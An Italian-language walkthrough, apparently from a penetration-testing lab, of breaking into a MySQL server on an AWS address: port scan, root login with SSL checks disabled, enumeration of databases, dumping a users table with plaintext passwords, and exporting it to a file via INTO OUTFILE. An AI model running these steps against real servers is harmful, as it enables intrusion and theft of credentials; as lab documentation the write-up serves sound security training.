# MySQL

### 1. **Connessione al database MySQL**

Esplorare il database MySQL nella macchina target, identificare vulnerabilità e ottenere informazioni sensibili, come credenziali

#### Comando:
```bash
nmap -p 3306 35.152.43.69
```

***risultato***: 


```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-26 06:03 EDT
Nmap scan report for ec2-35-152-43-69.eu-south-1.compute.amazonaws.com (35.152.43.69)
Host is up (0.0024s latency).

PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds

```

***analisi***:
La porta 3306 è aperta per il servizio MySQL.

### **1.2 Tentativo di connessione via MySQL**
Abbiamo provato a connetterci al database MySQL da Kali usando la password di root, ma la connessione era protetta da SSL.

#### Comando:
```bash
mysql -h 35.152.43.69 -u root -p
```

output
```bash
ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
```


### **1.3 Connessione con SSL disabilitato**
Abbiamo disabilitato l'uso di SSL nella connessione per bypassare l'errore di certificato SSL.

#### Comando:
```bash
mysql -h 35.152.43.69 -u root -p --disable-ssl
```
Risultato: Connessione riuscita con successo.


### 2. **Esplorazione del database**

Esplorare i database e le tabelle per identificare informazioni sensibili.

#### Comando:
```bash
SHOW DATABASES;
```

***risultato***: 


```bash
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mydb               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

```bash
USE mydb;
```
```bash
SHOW TABLES;
```

***risultato***: 


```bash
+----------------+
| Tables_in_mydb |
+----------------+
| secrets        |
| users          |
+----------------+
```

```bash
SELECT * FROM users;
```

***risultato***: 


```bash
+----+----------+-----------+
| id | username | password  |
+----+----------+-----------+
|  1 | testuser | testpass  |
|  2 | admin    | adminpass |
|  3 | testuser | testpass  |
+----+----------+-----------+
```

```bash
SELECT * FROM users WHERE username = 'admin';
```

***risultato***: 


```bash
+----+----------+-----------+
| id | username | password  |
+----+----------+-----------+
|  2 | admin    | adminpass |
+----+----------+-----------+
```

### 3. **Esportazione dei dati**

Esplorare i database e le tabelle per identificare informazioni sensibili.

#### Comando:
```bash
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/users.csv'
FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"'
LINES TERMINATED BY '\n';
```

***risultato***: 
L'export è riuscito con successo.